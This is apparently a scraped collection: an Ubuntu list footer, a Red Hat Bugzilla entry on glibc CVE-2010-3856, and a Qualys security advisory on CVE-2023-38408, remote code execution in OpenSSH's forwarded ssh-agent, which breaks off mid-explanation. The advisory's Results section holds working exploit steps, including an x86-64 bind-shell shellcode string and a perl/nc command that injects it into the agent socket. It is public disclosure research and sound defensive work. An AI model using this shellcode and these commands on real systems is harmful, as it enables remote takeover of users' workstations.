  Gutsy Gibbon archive upload notification list
* [feisty-changes](http://lists.ubuntu.com/mailman/listinfo/feisty-changes) -
  Feisty Fawn archive upload notification list
* [edgy-changes](http://lists.ubuntu.com/mailman/listinfo/edgy-changes) -
  EdgyEft archive upload notification list

© 2013 Canonical Ltd. Ubuntu and Canonical are registered trademarks of [Canonical Ltd](http://canonical.com).



=== Content from bugzilla.redhat.com_ff398509_20250125_231156.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D645672)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D645672)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D645672)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 645672

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 645672**](show_bug.cgi?id=645672)
(CVE-2010-3856)
- [CVE-2010-3856](https://access.redhat.com/security/cve/CVE-2010-3856) glibc: ld.so arbitrary DSO loading via LD\_AUDIT in setuid/setgid programs

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD\_AUDIT in setuid/setgi...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2010-3856 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [645677](show_bug.cgi?id=645677) [645678](show_bug.cgi?id=645678) [645679](show_bug.cgi?id=645679) [645680](show_bug.cgi?id=645680) [645875](show_bug.cgi?id=645875 "CLOSED ERRATA - CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD_AUDIT in setuid/setgid programs [fedora-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=645672&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=645672&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2010-10-22 08:28 UTC by Petr Matousek | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2023-05-11 15:26 UTC ([History](show_activity.cgi?id=645672)) | | [CC List:](page.cgi?id=fields.html#cclist) | 15 users (show)  bob69xxx csieh ebachalo fweimer jakub jeder jlieskov kent nixon pasteur rcvalle rdassen roland schwab security-response-team | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2010-11-11 08:12:40 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2010:0793](https://access.redhat.com/errata/RHSA-2010%3A0793) | 0 | normal | SHIPPED\_LIVE | Important: glibc security update | 2010-10-25 18:54:26 UTC | | Red Hat Product Errata | [RHSA-2010:0872](https://access.redhat.com/errata/RHSA-2010%3A0872) | 0 | normal | SHIPPED\_LIVE | Important: glibc security and bug fix update | 2010-11-10 12:10:56 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=645672#c0)  Petr Matousek    2010-10-22 08:28:34 UTC  ``` Tavis Ormandy pointed out that glibc does not properly sanitize DSOs that are loaded using LD_AUDIT facility. Tavis quoted:    In order to be preloaded during the execution of a privileged program, a   library must be setuid and in the trusted library search path. This is a   reasonable design, in order to be loaded a system administrator must brand   a library as safe before it will be loaded across privilege boundaries.    This allows developers who design their programs to operate safely while   running as setuid are able to do so. The same conditions do not apply to   LD_AUDIT, which will load an arbitrary DSOs, regardless of whether it   has been designed to operate safely or not.  Tavis found out that by exploiting unsafely designed DSO constructors in trusted directories it is possible to achieve privilege escalation.  Acknowledgements:  Red Hat would like to thank Ben Hawkes and Tavis Ormandy for reporting this issue.   ```  [Comment 12](show_bug.cgi?id=645672#c12)  Petr Matousek    2010-10-22 17:02:38 UTC  ``` Reference:  <http://seclists.org/fulldisclosure/2010/Oct/344>   ```  [Comment 13](show_bug.cgi?id=645672#c13)  Petr Matousek    2010-10-22 18:05:31 UTC  ``` Created glibc tracking bugs for this issue  Affects: fedora-all [[bug 645875](show_bug.cgi?id=645875 "CLOSED ERRATA - CVE-2010-3856 glibc: ld.so arbitrary DSO loading via LD_AUDIT in setuid/setgid programs [fedora-all]")]   ```  [Comment 14](show_bug.cgi?id=645672#c14)  Roberto Yokota    2010-10-22 18:07:56 UTC  ``` Andreas Patch:  <http://sourceware.org/ml/libc-hacker/2010-10/msg00010.html>  Thanks,  Roberto Yokota   ```  [Comment 15](show_bug.cgi?id=645672#c15)  Petr Matousek    2010-10-23 09:40:32 UTC  ``` This issue did not affect the versions of glibc package as shipped with Red Hat Enterprise Linux 3 and 4 as these do not implement Auditing API for the dynamic linker.   ```  [Comment 18](show_bug.cgi?id=645672#c18)  errata-xmlrpc    2010-10-25 18:54:32 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5  Via RHSA-2010:0793 <https://rhn.redhat.com/errata/RHSA-2010-0793.html>   ```  [Comment 19](show_bug.cgi?id=645672#c19)  errata-xmlrpc    2010-11-10 18:57:35 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 6  Via RHSA-2010:0872 <https://rhn.redhat.com/errata/RHSA-2010-0872.html>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=645672&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.openwall.com_26547ea5_20250125_231147.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](../../../2023/07/20/1) [[thread-next>]](../../../2023/07/20/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20230719163318.GA9123@localhost.localdomain>
Date: Wed, 19 Jul 2023 16:33:30 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded
 ssh-agent

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
